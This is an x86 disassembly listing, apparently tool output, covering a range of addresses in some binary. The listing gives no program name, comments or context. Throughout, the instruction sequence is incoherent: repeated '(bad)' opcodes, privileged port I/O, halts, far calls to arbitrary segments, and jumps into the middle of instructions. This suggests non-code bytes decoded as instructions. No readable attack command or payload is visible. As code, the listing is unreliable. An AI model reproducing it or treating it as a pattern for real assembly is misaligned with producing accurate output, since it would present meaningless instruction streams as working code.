  438947:	cmp    BYTE PTR [ebp-0x53],0xf8
  43894b:	fadd   st,st(6)
  43894d:	sub    BYTE PTR [edx-0x7ee14633],bl
  438953:	scas   eax,DWORD PTR es:[edi]
  438954:	(bad)  
  438955:	jno    0x4389a6
  438957:	(bad)  
  438958:	cmc    
  438959:	add    eax,0x11599d4b
  43895e:	call   0xbd1d:0x63be704
  438965:	int    0x5e
  438967:	mov    eax,0x88f80818
  43896c:	mov    esp,0xa367a493
  438971:	xchg   ebx,eax
  438972:	iret   
  438973:	test   al,0x45
  438975:	jecxz  0x438958
  438977:	les    edx,FWORD PTR [edx]
  438979:	pop    ecx
  43897a:	lds    eax,FWORD PTR [ecx+0x34]
  43897d:	clc    
  43897e:	jle    0x43899b
  438980:	mov    dl,0x41
  438982:	fisubr DWORD PTR [ebp+ebx*2-0x295aceea]
  438989:	or     al,0xa3
  43898b:	pop    edi
  43898c:	std    
  43898d:	mov    ds:0xdb1f16f9,eax
  438992:	in     eax,dx
  438993:	jnp    0x4389b2
  438995:	test   DWORD PTR [ebx+0x13ae6df0],ebx
  43899b:	in     al,dx
  43899c:	loope  0x4389c9
  43899e:	cli    
  43899f:	psubd  mm1,QWORD PTR [ebx]
  4389a2:	add    DWORD PTR [edi],edx
  4389a4:	adc    eax,0x163b7728
  4389a9:	mov    ch,0x9a
  4389ab:	cld    
  4389ac:	jne    0x4389a7
  4389ae:	cmp    BYTE PTR [ebp-0x580c1602],0xba
  4389b5:	jmp    0x4aa3:0x853bca35
  4389bc:	mov    ch,0x76
  4389be:	fdivr  QWORD PTR [edi+0x33]
  4389c1:	add    eax,0x26ee5c5a
  4389c6:	mul    BYTE PTR [edi-0x2e22c3b1]
  4389cc:	rcl    DWORD PTR [ebx],1
  4389ce:	(bad)  
  4389cf:	sub    al,0xb2
  4389d1:	jg     0x4389b1
  4389d3:	test   eax,0xfa58a911
  4389d8:	xchg   ebx,eax
  4389d9:	or     edx,ecx
  4389db:	out    dx,al
  4389dc:	pop    eax
  4389dd:	dec    ebp
  4389de:	adc    ebx,DWORD PTR [eax]
  4389e0:	aas    
  4389e1:	or     eax,0xe2edae9a
  4389e6:	call   0x2faad259
  4389eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4389ec:	and    ah,dh
  4389ee:	out    0x76,al
  4389f0:	push   ss
  4389f1:	lods   al,BYTE PTR ds:[esi]
  4389f2:	xor    ecx,edx
  4389f4:	dec    eax
  4389f5:	adc    ebx,DWORD PTR [edx-0x2fd9e293]
  4389fb:	fild   WORD PTR [eax+ebp*8-0x70]
  4389ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438a00:	mov    edx,0xf1697b0e
  438a05:	or     DWORD PTR ds:0x2198b25f,ebp
  438a0b:	sub    edx,DWORD PTR [eax+0x3895af5f]
  438a11:	aaa    
  438a12:	inc    eax
  438a13:	mov    ebx,0x5b5adab0
  438a18:	hlt    
  438a19:	scas   al,BYTE PTR es:[edi]
  438a1a:	cli    
  438a1b:	jge    0x438a01
  438a1d:	pop    ebx
  438a1e:	call   0x59bf:0x840fdc8c
  438a25:	enter  0xa703,0xef
  438a29:	and    edx,eax
  438a2b:	aas    
  438a2c:	jne    0x4389e0
  438a2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438a2f:	mov    ch,0x5e
  438a31:	das    
  438a32:	call   0xf218:0x36ea18e3
  438a39:	sbb    bl,BYTE PTR [ebx+edi*4+0x54]
  438a3d:	sbb    edx,edx
  438a3f:	daa    
  438a40:	scas   eax,DWORD PTR es:[edi]
  438a41:	sbb    eax,0xa56b8ba6
  438a46:	call   0x877:0xc841484f
  438a4d:	mov    DWORD PTR [eax+edi*4],0xe76e71ad
  438a54:	fs aad 0x10
  438a57:	into   
  438a58:	mov    ds:0xacdf9aaa,al
  438a5d:	jmp    FWORD PTR fs:[esi-0x58cbb20b]
  438a64:	pop    ebp
  438a65:	ins    BYTE PTR es:[edi],dx
  438a66:	cld    
  438a67:	xchg   ebx,eax
  438a68:	or     DWORD PTR [edx],ebx
  438a6a:	sub    eax,0xd15db571
  438a6f:	bound  esi,QWORD PTR [esi-0x61332576]
  438a75:	int    0xa8
  438a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438a78:	loop   0x438ac2
  438a7a:	stc    
  438a7b:	aad    0x53
  438a7d:	arpl   WORD PTR [ebx],di
  438a7f:	fnstenv [edx-0x2cf4204d]
  438a85:	(bad)  [esi+0x370a38c5]
  438a8b:	mul    BYTE PTR [ebp-0x2c]
  438a8e:	cdq    
  438a8f:	sbb    al,al
  438a91:	iret   
  438a92:	test   DWORD PTR [ebx-0x4e],0x7411f105
  438a99:	test   BYTE PTR [esi-0x3b0e2952],bl
  438a9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438aa0:	gs pop ss
  438aa2:	inc    ecx
  438aa3:	push   es
  438aa4:	pop    edx
  438aa5:	cmp    BYTE PTR [ebx+0x6b],al
  438aa8:	daa    
  438aa9:	add    eax,0xb0ef409a
  438aae:	jns    0x438a9c
  438ab0:	pop    ebp
  438ab1:	cli    
  438ab2:	and    BYTE PTR [edi-0x4d73e304],0xae
  438ab9:	(bad)  
  438aba:	cmp    BYTE PTR [eax],bl
  438abc:	mov    dl,0x74
  438abe:	mov    DWORD PTR [edi],ebx
  438ac0:	int3   
  438ac1:	mov    edi,0xe35069fb
  438ac6:	loope  0x438a6f
  438ac8:	lea    edi,[eax+0x7b]
  438acb:	(bad)  
  438acc:	jp     0x438a83
  438ace:	push   0x51
  438ad0:	push   ecx
  438ad1:	sti    
  438ad2:	(bad)  
  438ad3:	out    0xb1,eax
  438ad5:	fisttp WORD PTR [esi+0x161dbc37]
  438adb:	aaa    
  438adc:	jne    0x438b0b
  438ade:	stos   DWORD PTR es:[edi],eax
  438adf:	test   eax,0xd92f35dd
  438ae4:	push   edx
  438ae5:	xchg   ecx,eax
  438ae6:	inc    esp
  438ae7:	ins    BYTE PTR es:[edi],dx
  438ae8:	and    ecx,esi
  438aea:	call   0xe288:0xa2b631be
  438af1:	mov    ebp,0xa08eb40b
  438af6:	mov    ah,0xa7
  438af8:	xchg   DWORD PTR [edi-0x55],eax
  438afb:	xchg   bl,bh
  438afd:	push   esp
  438afe:	call   0x66b8:0xd7cca64b
  438b05:	sar    DWORD PTR [esi-0x64f4b5c1],0x9a
  438b0c:	and    bh,BYTE PTR [esi-0x55]
  438b0f:	outs   dx,DWORD PTR ds:[esi]
  438b10:	hlt    
  438b11:	pop    eax
  438b12:	call   0x5c0f:0x7c5c5526
  438b19:	cli    
  438b1a:	and    DWORD PTR [edi+0x238cdef8],0xc9c052bd
  438b24:	mov    dl,0x81
  438b26:	xchg   DWORD PTR [esi+0x3d82a3cb],esp
  438b2c:	(bad)  
  438b2d:	or     al,BYTE PTR [ebx+0x14]
  438b30:	test   al,0x7d
  438b32:	sbb    eax,0xd3d76a9d
  438b37:	inc    esi
  438b38:	mov    bl,0xef
  438b3a:	test   al,0xea
  438b3c:	inc    esi
  438b3d:	bnd ret 0x76a9
  438b41:	lods   al,BYTE PTR ds:[esi]
  438b42:	and    DWORD PTR [edi+0x7be4185d],0xcdc90142
  438b4c:	mov    dl,0x54
  438b4e:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438b50:	fnstenv [esi]
  438b52:	pusha  
  438b53:	jmp    0x49ed96f0
  438b58:	daa    
  438b59:	fdiv   QWORD PTR [ecx+ebx*4+0x3b9ad6ee]
  438b60:	jmp    0x438bd3
  438b62:	mov    ds:0xc2abdbc3,al
  438b67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438b68:	xor    BYTE PTR [edx+0x47968ff1],ch
  438b6e:	out    dx,al
  438b6f:	inc    esi
  438b70:	mov    ch,0x9
  438b72:	lahf   
  438b73:	push   0x8dcebf75
  438b78:	xor    bh,BYTE PTR [edx]
  438b7a:	sbb    edi,edx
  438b7c:	jmp    0x438bef
  438b7e:	test   eax,0x25df4fb8
  438b83:	and    al,0xf9
  438b85:	shr    DWORD PTR [edi],0x9a
  438b88:	and    ch,BYTE PTR [edx+0xe]
  438b8b:	xchg   edi,eax
  438b8c:	mov    dl,0x7f
  438b8e:	add    dh,BYTE PTR [ecx-0x11]
  438b91:	and    BYTE PTR [edi+eax*8+0x6840b96],bh
  438b98:	jno    0x438b97
  438b9a:	jg     0x438b77
  438b9c:	test   BYTE PTR [esi+0x71af4d2a],bh
  438ba2:	cmp    BYTE PTR [edi-0x4e],dl
  438ba5:	add    BYTE PTR [ecx],al
  438ba7:	punpcklwd mm0,DWORD PTR [edx+0x33]
  438bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438bac:	pop    ds
  438bad:	rcl    DWORD PTR [edi+0x7d],cl
  438bb0:	and    DWORD PTR [esi],edx
  438bb2:	or     bl,BYTE PTR [ebp-0x4e]
  438bb5:	test   eax,0xc09fdcbc
  438bba:	retf   0x59df
  438bbd:	or     esp,DWORD PTR [ebx]
  438bbf:	push   ebx
  438bc0:	pop    ss
  438bc1:	in     eax,dx
  438bc2:	jecxz  0x438b79
  438bc4:	xchg   ebp,eax
  438bc5:	add    BYTE PTR [edx+0x1d28d7bb],bl
  438bcb:	mov    esi,0x9d24207c
  438bd0:	mov    ah,0x69
  438bd2:	add    al,0x29
  438bd4:	test   BYTE PTR [eax+0x5e],0x3a
  438bd8:	fild   WORD PTR [ecx]
  438bda:	sub    ah,dh
  438bdc:	repnz sbb al,0x76
  438bdf:	repnz mov ebp,0x41a6bdc
  438be5:	or     dl,bh
  438be7:	mov    ds:0xb8ea6f50,eax
  438bec:	inc    ebp
  438bed:	or     esp,DWORD PTR ds:0x7bf214ec
  438bf3:	out    0x2e,al
  438bf5:	sbb    al,0x9a
  438bf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438bf8:	and    BYTE PTR [esi+0x7d],bl
  438bfb:	mov    ds:0xb8f8cbcd,al
  438c00:	and    al,0xa0
  438c02:	ret    0x9026
  438c05:	cmp    dh,dl
  438c07:	in     eax,dx
  438c08:	jl     0x438bf9
  438c0a:	cmp    eax,0x36d1b27e
  438c0f:	mov    edx,0xfb8ce948
  438c14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438c15:	imul   DWORD PTR [edi]
  438c17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438c18:	test   eax,0x5bb79b9f
  438c1d:	shl    DWORD PTR [ebp-0x42],0xb1
  438c21:	test   BYTE PTR [ebx+eiz*2],bl
  438c24:	sti    
  438c25:	pop    es
  438c26:	test   BYTE PTR [edi-0x7b],dh
  438c29:	jp     0x438c18
  438c2b:	addr16 ds mov ebx,0x35ad537f
  438c32:	call   0x1bc3:0x727798ad
  438c39:	cs xor eax,0x9cf59eba
  438c3f:	test   al,0x62
  438c41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438c42:	sbb    ch,BYTE PTR [eax-0x29ddb6c8]
  438c48:	mov    dl,0x6b
  438c4a:	das    
  438c4b:	mov    ebx,0x24213d5a
  438c50:	xor    BYTE PTR [eax],0x4f
  438c53:	pushf  
  438c54:	xor    bh,al
  438c56:	bound  ecx,QWORD PTR [edx-0x40926c72]
  438c5c:	mov    dl,0xab
  438c5e:	cmp    BYTE PTR [esi+0x3ad7e19a],dh
  438c64:	retf   
  438c65:	adc    al,0x81
  438c67:	adc    al,0xf4
  438c69:	mov    ebp,DWORD PTR [esi]
  438c6b:	das    
  438c6c:	sub    ecx,DWORD PTR [edi+0x535ec665]
  438c72:	call   0x697f:0x32876d35
  438c79:	cmp    BYTE PTR [ecx-0xd046259],dh
  438c7f:	aam    0x28
  438c81:	cmp    al,BYTE PTR [edi+0xcbfb61a]
  438c87:	push   ebp
  438c88:	xchg   edx,eax
  438c89:	repz sbb eax,DWORD PTR [edi+0x41]
  438c8d:	mov    BYTE PTR [edx-0x69],al
  438c90:	inc    esp
  438c91:	or     ecx,DWORD PTR ds:0x66c686fe
  438c97:	sub    DWORD PTR [eax],esp
  438c99:	ficomp DWORD PTR [edx-0x54a624d8]
  438c9f:	jne    0x438ce2
  438ca1:	mul    BYTE PTR [esi-0x32f491ab]
  438ca7:	cld    
  438ca8:	sar    DWORD PTR fs:[ebx],1
  438cab:	mov    ch,0x35
  438cad:	loopne 0x438c8f
  438caf:	shl    DWORD PTR [edx+0xbb900d0],1
  438cb5:	xor    dh,BYTE PTR [eax+0x41]
  438cb8:	push   ebx
  438cb9:	repnz data16 repz loope 0x438cc9
  438cbe:	xor    DWORD PTR [ecx-0x3b],esp
  438cc1:	mov    ecx,0x9ad522a8
  438cc6:	cwde   
  438cc7:	imul   eax,ebx,0x313894e6
  438ccd:	imul   edx,ebx,0x75
  438cd0:	outs   dx,BYTE PTR ds:[esi]
  438cd1:	push   cs
  438cd2:	mov    ds:0x3b24d914,eax
  438cd7:	daa    
  438cd8:	lods   eax,DWORD PTR ds:[esi]
  438cd9:	inc    esp
  438cda:	inc    esp
  438cdc:	sahf   
  438cdd:	or     al,BYTE PTR [ecx+0xd27b26e]
  438ce3:	sub    ch,BYTE PTR [edi+0x36a0ec87]
  438ce9:	test   DWORD PTR [ebx+0x61],ebx
  438cec:	loop   0x438d69
  438cee:	out    dx,al
  438cef:	leave  
  438cf0:	fucomip st,st(0)
  438cf2:	fwait
  438cf3:	test   DWORD PTR [ecx-0x72],eax
  438cf6:	scas   al,BYTE PTR es:[edi]
  438cf7:	stos   DWORD PTR es:[edi],eax
  438cf8:	sub    ebp,DWORD PTR ds:0xc1a195a
  438cfe:	arpl   WORD PTR [ecx],si
  438d00:	test   edi,0xe6f13992
  438d06:	je     0x438cc5
  438d08:	bound  ebx,QWORD PTR [ebp+0x53]
  438d0b:	mov    ds:0x94c95ab2,al
  438d10:	pop    ebx
  438d11:	sub    DWORD PTR [edx+0x60ba33d],ebp
  438d17:	ja     0x438ccd
  438d19:	xor    BYTE PTR [ecx-0x78964e5a],cl
  438d1f:	(bad)  
  438d20:	pop    ds
  438d21:	lock pop edx
  438d23:	adc    BYTE PTR [eax+0x63634654],dl
  438d29:	hlt    
  438d2a:	stos   BYTE PTR es:[edi],al
  438d2b:	sahf   
  438d2c:	dec    edx
  438d2d:	add    bh,BYTE PTR [esi]
  438d2f:	inc    edi
  438d30:	inc    eax
  438d31:	dec    ebp
  438d32:	div    DWORD PTR fs:[edx+0x548fb69a]
  438d39:	jl     0x438d3e
  438d3b:	aad    0xf3
  438d3d:	or     ecx,DWORD PTR [eax+0x6d]
  438d40:	pop    eax
  438d41:	or     DWORD PTR [esi],ebx
  438d43:	out    0xd3,eax
  438d45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438d46:	mov    WORD PTR [ebp+0x139ad1dc],ds
  438d4c:	cmp    eax,0x3c9c5303
  438d51:	or     al,ch
  438d53:	ins    BYTE PTR es:[edi],dx
  438d54:	ret    
  438d55:	mov    ch,0xa2
  438d57:	sbb    eax,0x7f99734b
  438d5c:	dec    ecx
  438d5d:	add    eax,0xeab25b6c
  438d62:	retf   0xa7c3
  438d65:	add    al,0xe0
  438d67:	ss dec ebp
  438d69:	jo     0x438d2c
  438d6b:	dec    ecx
  438d6d:	gs call 0x8756:0x934c3e86
  438d75:	mov    eax,0xcab281e4
  438d7a:	xor    bh,BYTE PTR [ebp-0x59ddb9aa]
  438d80:	ins    DWORD PTR es:[edi],dx
  438d81:	or     ebp,eax
  438d83:	push   ebx
  438d84:	push   0xb7df3cbc
  438d89:	pop    DWORD PTR [ebx+ebp*8+0x28632066]
  438d90:	int3   
  438d91:	loopne 0x438dce
  438d93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438d94:	inc    ebp
  438d95:	(bad)  
  438d96:	lock in eax,0xd3
  438d99:	xor    eax,0xb031dd5c
  438d9e:	stos   BYTE PTR es:[edi],al
  438d9f:	sahf   
  438da0:	adc    ch,dh
  438da2:	inc    edx
  438da3:	loop   0x438d83
  438da5:	out    dx,al
  438da6:	test   DWORD PTR [ecx+0x4b],ecx
  438da9:	mov    edx,ebx
  438dab:	inc    ebp
  438dac:	shl    BYTE PTR [esi+0xb569a95],cl
  438db2:	stos   DWORD PTR es:[edi],eax
  438db3:	pop    eax
  438db4:	inc    esp
  438db5:	mov    al,ds:0x14b405bb
  438dba:	call   0x27fd:0x610f4548
  438dc1:	mov    edi,0xd32ba440
  438dc6:	dec    ebx
  438dc7:	cwde   
  438dc8:	or     DWORD PTR [ebx],esp
  438dca:	cmp    eax,0x90833567
  438dcf:	js     0x438d7e
  438dd1:	push   es
  438dd2:	sub    eax,0x7a38729a
  438dd7:	mov    eax,0xa77d4c79
  438ddc:	fs jle 0x438d6e
  438ddf:	gs stos BYTE PTR es:[edi],al
  438de1:	fmul   DWORD PTR [edx+0x5d]
  438de4:	mov    dl,0x10
  438de6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438de7:	xchg   DWORD PTR [eax+0x5e],edx
  438dea:	idiv   BYTE PTR [eax]
  438dec:	inc    edi
  438ded:	inc    ebx
  438dee:	sub    DWORD PTR [eax-0x4e],ebx
  438df1:	hlt    
  438df2:	pop    ds
  438df3:	das    
  438df4:	mov    ds:0x8a679ceb,eax
  438df9:	mov    cl,0x49
  438dfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438dfc:	jo     0x438dc6
  438dfe:	aas    
  438dff:	sbb    dh,al
  438e01:	(bad)  
  438e02:	push   cs
  438e03:	mov    al,ds:0xcf13a6e6
  438e08:	ds loop 0x438e25
  438e0b:	pop    ds
  438e0c:	in     al,0x4a
  438e0e:	mov    ebx,0x6c95b2e4
  438e13:	fisubr WORD PTR [ecx]
  438e15:	push   edi
  438e16:	stc    
  438e17:	mov    BYTE PTR [ebp+0x3ee9e10a],cl
  438e1d:	inc    esp
  438e1e:	fs test al,0xdd
  438e21:	sub    bh,dh
  438e23:	push   edi
  438e24:	inc    ecx
  438e25:	jge    0x438dc1
  438e27:	add    DWORD PTR [esi+0x6c],esi
  438e2a:	fidiv  WORD PTR [ebp-0x4c]
  438e2d:	popa   
  438e2e:	lahf   
  438e2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438e30:	lods   eax,DWORD PTR ds:[esi]
  438e31:	imul   edx,edx,0x1fabfff8
  438e37:	or     BYTE PTR [eax+0x6e],cl
  438e3a:	test   DWORD PTR [ebx],edx
  438e3c:	or     al,0xd0
  438e3e:	pop    edx
  438e3f:	ret    
  438e40:	mov    DWORD PTR [ebx+0x2f684491],edx
  438e46:	dec    eax
  438e47:	pop    ds
  438e48:	dec    ecx
  438e49:	or     al,0xb3
  438e4b:	out    0x83,al
  438e4d:	sub    edx,DWORD PTR [ecx+ebp*2]
  438e50:	std    
  438e51:	mov    ds:0xe9841c9a,al
  438e56:	push   esi
  438e57:	hlt    
  438e58:	rcl    BYTE PTR [edx],0xd3
  438e5b:	pop    edx
  438e5c:	push   edi
  438e5d:	mov    eax,0xb085a76
  438e62:	cmp    BYTE PTR [ecx-0x3ab300b6],bh
  438e68:	iret   
  438e69:	out    dx,eax
  438e6a:	xchg   ecx,eax
  438e6b:	mov    bh,0x36
  438e6d:	cmp    eax,0x99e0276a
  438e72:	mov    ah,0x24
  438e74:	pop    ecx
  438e75:	or     ch,BYTE PTR [ebx-0x45]
  438e78:	cld    
  438e79:	fldcw  WORD PTR [edx+ebx*2+0x69]
  438e7d:	jecxz  0x438e6e
  438e7f:	ds mov dl,0xf9
  438e82:	hlt    
  438e83:	and    bl,BYTE PTR [edi]
  438e85:	es mov al,0xac
  438e88:	cmp    DWORD PTR [ebx*8+0x75743123],ecx
  438e8f:	pop    ss
  438e90:	add    esi,DWORD PTR [edi]
  438e92:	sbb    al,0xf3
  438e94:	mov    dl,0x72
  438e96:	das    
  438e97:	or     al,0x32
  438e99:	dec    ebp
  438e9a:	or     eax,DWORD PTR [ebp+0x7f]
  438e9d:	inc    ebx
  438e9e:	xor    eax,0xc75bb224
  438ea3:	aas    
  438ea4:	cs loopne 0x438ed4
  438ea7:	xor    BYTE PTR [eax+0x76c8583b],0xa7
  438eae:	push   ebp
  438eaf:	inc    edi
  438eb0:	rol    DWORD PTR [eax],cl
  438eb2:	(bad)  [edi+0x201ac6d4]
  438eb8:	lods   al,BYTE PTR ds:[esi]
  438eb9:	outs   dx,BYTE PTR ds:[esi]
  438eba:	cli    
  438ebb:	mov    DWORD PTR [esi-0x46],ecx
  438ebe:	call   0xff61:0x1ca052e1
  438ec5:	rcl    BYTE PTR [ebx-0x2d9c8559],1
  438ecb:	sub    al,0x85
  438ecd:	dec    edi
  438ece:	out    0x81,al
  438ed0:	mov    dl,0x8a
  438ed2:	adc    bl,BYTE PTR [ecx-0x4d0ee057]
  438ed8:	fadd   DWORD PTR ds:0x41911e34
  438ede:	jp     0x438e60
  438ee0:	into   
  438ee1:	(bad)  
  438ee2:	jl     0x438ec6
  438ee4:	mov    ebp,0xb5bed845
  438ee9:	mov    BYTE PTR [ecx],dl
  438eeb:	pop    esi
  438eec:	sub    eax,0x9e0c02fb
  438ef1:	add    al,0xfc
  438ef3:	js     0x438ec5
  438ef5:	jmp    0xde1ebdf4
  438efa:	jae    0x438e9c
  438efc:	mov    bh,BYTE PTR [edx+0x1002754]
  438f02:	(bad)  
  438f05:	dec    ecx
  438f06:	cld    
  438f07:	addr16 cmp dh,cl
  438f0a:	dec    esp
  438f0b:	cmp    eax,0x9c9a8643
  438f10:	xor    al,0x93
  438f12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438f13:	jne    0x438eab
  438f15:	cmp    BYTE PTR [edi+eiz*4+0x3b3b46cc],al
  438f1c:	push   edx
  438f1d:	jo     0x438f92
  438f1f:	mov    edi,0xf47565b2
  438f24:	adc    al,0xa8
  438f26:	and    eax,0xa20b297b
  438f2b:	jl     0x438f9f
  438f2d:	shl    al,0xae
  438f30:	dec    eax
  438f31:	cli    
  438f32:	call   0xc936:0x7a0f7370
  438f39:	adc    DWORD PTR [ecx-0x7c773e13],0x785b4227
  438f43:	arpl   WORD PTR [ebp+0xb15ad7d],si
  438f49:	scas   al,BYTE PTR es:[edi]
  438f4a:	mov    edx,0xd3721191
  438f4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438f50:	or     eax,0xae22353e
  438f55:	sbb    cl,cl
  438f57:	lods   al,BYTE PTR ds:[esi]
  438f58:	mov    dl,0x76
  438f5a:	fcmove st,st(5)
  438f5c:	jb     0x438f1a
  438f5e:	push   esp
  438f5f:	xchg   ebp,eax
  438f60:	les    ecx,FWORD PTR [edi+esi*4]
  438f63:	jp     0x438ef8
  438f65:	or     BYTE PTR [edx-0x5e0bed27],bh
  438f6b:	inc    edi
  438f6c:	in     al,dx
  438f6d:	lods   eax,DWORD PTR ds:[esi]
  438f6e:	call   0x8774:0xdedead4
  438f75:	mov    gs,esi
  438f77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438f78:	jge    0x438fc1
  438f7a:	jne    0x438f4d
  438f7c:	das    
  438f7d:	or     al,0xb0
  438f7f:	arpl   WORD PTR [edx+0x511dd83d],si
  438f85:	mov    ah,0x1e
  438f87:	jb     0x438fa7
  438f89:	or     esp,DWORD PTR [edi]
  438f8b:	pop    ebp
  438f8c:	jnp    0x438fbb
  438f8e:	(bad)  
  438f8f:	dec    edi
  438f90:	mov    al,ds:0x9543997c
  438f95:	xchg   ecx,edi
  438f97:	ins    DWORD PTR es:[edi],dx
  438f98:	add    BYTE PTR [ebx+0xb344b02],ah
  438f9e:	xchg   ecx,eax
  438f9f:	push   cs
  438fa0:	fwait
  438fa1:	sbb    eax,0x9f450678
  438fa6:	call   0xfd5f:0xac2e35cc
  438fad:	fimul  WORD PTR [eax-0x5c]
  438fb0:	mov    ebx,0xb4af798e
  438fb5:	ret    
  438fb6:	bound  edi,QWORD PTR [eax]
  438fb8:	dec    eax
  438fb9:	hlt    
  438fba:	popf   
  438fbb:	or     dh,BYTE PTR [eax]
  438fbd:	leave  
  438fbe:	add    esi,DWORD PTR [eax+0x33]
  438fc1:	fimul  WORD PTR [ebx]
  438fc3:	les    edi,FWORD PTR [edx+0x60]
  438fc6:	xchg   edx,eax
  438fc7:	(bad)  
  438fc8:	cmp    al,0x33
  438fca:	jmp    0x591b:0x2981b284
  438fd1:	jl     0x438fab
  438fd3:	xchg   edi,eax
  438fd4:	mov    bl,0xa0
  438fd6:	aad    0x65
  438fd8:	call   0x4afcd8df
  438fdd:	adc    ch,dh
  438fdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438fe0:	shr    DWORD PTR [ebp+0x77],0x67
  438fe4:	jle    0x438f98
  438fe6:	xchg   ebp,eax
  438fe7:	outs   dx,DWORD PTR ds:[esi]
  438fe8:	cdq    
  438fe9:	bound  ebx,QWORD PTR [edx-0x7ea2b9b1]
  438fef:	add    dh,BYTE PTR fs:[ebx]
  438ff2:	rol    DWORD PTR gs:[esi+0x17c8710b],cl
  438ff9:	mov    al,ds:0xc00e3391
  438ffe:	call   0x44a4:0x921301bd
  439005:	out    0xbf,al
  439007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439008:	xchg   ecx,eax
  439009:	push   cs
  43900a:	retf   0x3627
  43900d:	sub    eax,0xdab2f072
  439012:	xchg   dl,bl
  439014:	adc    al,0x71
  439016:	test   BYTE PTR [edx],bh
  439018:	aad    0xb
  43901a:	mov    edi,0x5847e946
  43901f:	pop    esp
  439020:	adc    ch,bh
  439022:	call   0x6f8b:0x4c74a017
  439029:	cmp    DWORD PTR [ecx-0x5c],ebx
  43902c:	stos   BYTE PTR es:[edi],al
  43902d:	lods   eax,DWORD PTR ds:[esi]
  43902e:	mov    cl,0x73
  439030:	jnp    0x4390ab
  439032:	dec    edx
  439033:	pop    eax
  439034:	inc    ecx
  439035:	push   esp
  439036:	call   0x2f3b:0x3e44e62f
  43903d:	mov    cl,0x94
  43903f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439040:	cwde   
  439041:	cmp    eax,0xb3785deb
  439046:	mov    al,ds:0xfdb494f
  43904b:	fbstp  TBYTE PTR [edx+0x20aca25b]
  439051:	std    
  439052:	data16 cmp dl,bl
  439055:	or     edx,DWORD PTR ds:0xe794f87e
  43905b:	test   BYTE PTR [edx],0x8b
  43905e:	call   0x6926:0x104e1265
  439065:	cmc    
  439066:	cli    
  439067:	jmp    0x4390ab
  439069:	xchg   esp,eax
  43906a:	call   0x1655:0xb0851534
  439071:	jbe    0x43900d
  439073:	jg     0x4390be
  439075:	xchg   esi,eax
  439076:	jle    0x439069
  439078:	and    BYTE PTR [eax],dh
  43907a:	test   eax,0xe4fdebf7
  43907f:	(bad)  [esi]
  439081:	or     ebp,DWORD PTR [esi+0x3bd59e32]
  439087:	sbb    DWORD PTR [ebp+0xa],esp
  43908a:	call   0x64ee:0xd0814c1c
  439091:	dec    cx
  439093:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439094:	imul   ebp,ecx,0xffffffc3
  439097:	in     al,dx
  439098:	inc    esp
  439099:	in     eax,0x5c
  43909b:	jnp    0x439045
  43909d:	inc    ebp
  43909e:	xchg   ebx,eax
  43909f:	lods   al,BYTE PTR ds:[esi]
  4390a0:	jle    0x4390fe
  4390a2:	jge    0x4390cb
  4390a4:	enter  0x6b0d,0x8d
  4390a8:	mov    cl,0xf1
  4390aa:	(bad)  
  4390ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4390ac:	push   ebx
  4390ad:	hlt    
  4390ae:	or     ch,BYTE PTR [ebp-0x1d87d6fa]
  4390b4:	jb     0x4390b2
  4390b6:	push   ecx
  4390b7:	xor    DWORD PTR [edx-0x3018d89a],0xa226a4a
  4390c1:	or     ecx,ebx
  4390c3:	jg     0x43909d
  4390c5:	aad    0xdf
  4390c7:	stos   BYTE PTR es:[edi],al
  4390c8:	adc    dh,BYTE PTR [edx-0x66]
  4390cb:	icebp  
  4390cc:	cmp    ecx,ebp
  4390ce:	add    edx,ebp
  4390d0:	push   eax
  4390d1:	mov    eax,0xe345b006
  4390d6:	sub    BYTE PTR [edi+0x2b514d6b],ah
  4390dc:	sbb    al,0xe1
  4390de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4390df:	rcr    BYTE PTR [esi],0x8
  4390e2:	cwde   
  4390e3:	add    dh,bl
  4390e5:	out    0xd8,al
  4390e7:	push   bp
  4390e9:	fld    DWORD PTR [edx+0x5e]
  4390ec:	sub    BYTE PTR [ebx],cl
  4390ee:	sub    cl,ah
  4390f0:	shl    BYTE PTR [eax-0x41],cl
  4390f3:	pusha  
  4390f4:	out    0x2,al
  4390f6:	sub    cl,BYTE PTR [ebx]
  4390f8:	mov    bl,0x78
  4390fa:	sti    
  4390fb:	cmp    al,0x65
  4390fd:	into   
  4390fe:	xchg   esi,eax
  4390ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439100:	push   edx
  439101:	push   eax
  439102:	lock pop ebx
  439104:	mov    ecx,0x6e3bd30a
  439109:	jp     0x4390df
  43910b:	xchg   ebp,eax
  43910c:	pop    eax
  43910d:	out    dx,al
  43910e:	sahf   
  43910f:	push   ebx
  439110:	ja     0x439130
  439112:	popf   
  439113:	jp     0x439150
  439115:	fnstenv [edi]
  439117:	add    DWORD PTR [edx-0x8666c9e],0xb
  43911e:	(bad)  
  43911f:	and    bh,BYTE PTR [eax+0xa]
  439122:	jnp    0x43913f
  439124:	stos   DWORD PTR es:[edi],eax
  439125:	js     0x4390b4
